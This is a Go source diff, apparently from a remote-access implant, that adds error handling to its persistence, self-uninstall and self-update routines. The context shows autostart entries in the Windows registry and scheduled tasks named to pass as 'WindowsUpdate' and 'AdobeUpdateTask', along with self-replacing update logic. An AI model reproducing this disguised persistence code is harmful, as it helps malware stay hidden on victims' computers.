@@ -23,9 +23,13 @@ func addPersistence() {
 	case "windows":
 		addPersistenceWindows()
 	case "linux":
-		addPersistenceLinux()
+		if err := addPersistenceLinux(); err != nil { //nolint:staticcheck // dual-GOOS dispatch: the other GOOS's stub returns a constant, making this branch statically dead; here it can genuinely fail
+			fmt.Printf("[!] Persistence (linux): %v\n", err)
+		}
 	case "darwin":
-		addPersistenceDarwin()
+		if err := addPersistenceDarwin(); err != nil { //nolint:staticcheck // dual-GOOS dispatch: the other GOOS's stub returns a constant, making this branch statically dead; here it can genuinely fail
+			fmt.Printf("[!] Persistence (darwin): %v\n", err)
+		}
 	default:
 		fmt.Printf("[!] Persistence not supported on %s\n", runtime.GOOS)
 	}
@@ -39,10 +43,11 @@ func uninstallSelf() (string, error) {
 	// of which install path was used.
 	if runtime.GOOS == "windows" {
 		for _, name := range []string{persistencePrefix, "WindowsUpdate"} {
-			runShell(`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v `+name+` /f`, "cmd.exe")
+			// uninstall comment block above: best effort by design
+			_, _ = runShell(`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v `+name+` /f`, "cmd.exe")
 		}
 		for _, name := range []string{persistencePrefix, persistencePrefix + "Update", "AdobeUpdateTask"} {
-			runShell("schtasks /delete /tn "+name+" /f", "cmd.exe")
+			_, _ = runShell("schtasks /delete /tn "+name+" /f", "cmd.exe")
 		}
 		appData := os.Getenv("APPDATA")
 		startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
@@ -189,7 +194,8 @@ func selfUpdate(cmdJSON string) string {
 
 	// Make temp file executable (Linux)
 	if runtime.GOOS != "windows" {
-		os.Chmod(tmpPath, 0755)
+		// Executable bit is best-effort; the task carries its own shebang-driven runner.
+		_ = os.Chmod(tmpPath, 0755)
 	}
 
 	// Create wrapper script to replace and restart
